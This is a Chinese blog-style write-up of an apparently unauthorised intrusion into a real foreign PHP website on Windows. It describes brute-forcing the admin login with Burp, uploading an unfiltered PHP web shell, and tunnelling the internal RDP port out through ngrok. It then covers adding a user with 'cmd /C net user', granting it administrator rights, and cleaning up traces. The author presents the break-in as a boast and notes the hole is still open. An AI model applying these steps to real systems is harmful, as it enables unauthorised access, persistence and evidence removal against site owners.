# 一个弱口令引发的血案

这个站是去年8月份的，当然，不是国内的站。后来这个站都被人日穿了。当时也没想着写文章。前段时间去看了看发现，漏洞还存在。所有有了这篇文章。  

发现一个 php 的站，Apache 的容器 Windows 的系统 .IP 嘛，当然站是国外的。这里以 ip 就以123.123.1.1 代替。 一顿目录乱扫，发现后台竟然是admin 。 Test.php 并没什么卵用。

![](../Images/3196ca3ae6cf034a22740b3057f008f5.png)

打开后台是长这样的。  

![](../Images/e886d65a33d096d67cffe367ae0a3f79.png)

测试了下，admin 123456 ，admin  88888888 然而并没有成功。

 直接上burp爆破吧。

![](../Images/e335581facb10c38de3ad000c6945bc5.png)

尝试了下弱口令。但是并没有跑出来。 

这里浪费我比较长的时间。换了几个字典也没跑出来，最后还是掏出了我珍藏已久的“杀器”。终于是跑出来了。

但是我发现一点细节。很多密码的返回包是一模一样的。

![](../Images/f4653c6c2c26e867ae7a6b4d92a949d4.png)

 这里我们就查看，正确的返回包的第一个密码，或者最后一个密码。就可以分辨了哪一个是正确的密码了。

 登录后台，找上传点。

![](../Images/db39a745c7cc537ea466472578eb43a4.png)

通过抓包修改，发现并没有过滤。可直接上传php脚本，并解析。

![](../Images/5554cb41eac538fa97cd1745897f0aa9.png)

自此，我们拿到了对整个网站的增，删，改，查，的权限。  

发现这台服务器，开了3389。

![](../Images/3ccf62141c906a80e5b598f05c42e266.png)

 但是，死活连接不上。是内网。需要把流量转发出来。

 查看了下当前的进程  并没什么防护软件。

![](../Images/3a62c2874ef7143b943daf92f8f74a4e.png)

我这里用的是Ngrok ，上传之后执行。

当前存储路径比如C:\\Program Files\\ngrok.exe。authtoken 密匙。

提示已保存至C盘什么什么的目录。这里我们需要记得，到时候要删除掉。

![](../Images/25a4dcc2372abcc5135a53eb527b5918.png)

  

再执行 C:\\Program Files\\ngrok.exe\\ngrok.exe tcp 3389 ，将当前内网的3389端口转发至公网服务器，然后我们去ngrok官网看看，分配的公网服务器地址。

![](../Images/2d86a5950ff54f131907c1cae62c5aa9.png)

 这时候，远程连接问题是搞定的。

![](../Images/20ca2d5912a67694cb3b436446b42eb0.png)

  

因为，之前就查看了当前权限。

![](../Images/5e634b82806e5d449fcc7b519a917485.png)

这里浪费了半小时左右怎么都添加不了用户。后来执行了这条命令 cmd /C net user

终于成功的，添加了用户名。

![](../Images/9d88416092fdb809e82d5c1417f9f2da.png)

 然后把用户添加到管理员列表。

![](../Images/4b3ce4c554593dbaa59f8c3892650836.png)

  

登录成功。完事。清理，撤退。

![](../Images/3b8908cea458d807aadf439c120b6485.png)
